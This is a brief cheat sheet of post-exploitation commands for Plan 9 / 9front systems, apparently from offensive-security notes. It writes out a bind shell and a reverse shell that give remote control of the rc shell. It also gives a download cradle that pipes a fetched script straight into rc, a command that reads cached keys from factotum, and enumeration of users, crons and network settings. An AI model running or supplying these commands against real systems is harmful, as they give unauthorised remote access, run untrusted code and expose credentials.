**Bind Shell**<br />
`aux/listen1 -t tcp!*!1334 /bin/rc`<br />
`nc 192.168.9.3 1334`

**Reverse Shell**<br />
``srv -q tcp!192.168.1.222!1334 reverse_shell; while (i=`{read -n 1 /srv/reverse_shell}) { echo $i | rc >> /srv/reverse_shell }; rm /srv/reverse_shell``<br />
`nc -nlvp 1334`

**Download Cradles**<br />
`webfs; hget http://9front.lan/hello.rc | rc`

**Users / Groups list**<br />
`cat /adm/users`

**Cached User keys**<br />
`cat /mnt/factotum/ctl`

**Crons**<br />
`ls -l /cron/*/cron`

**Network Settings**<br />
`cat /net/ndb`

**Other UNIX Commands to Plan 9 Translation:**<br />
https://9p.io/wiki/plan9/Unix_to_Plan_9_command_translation/index.html
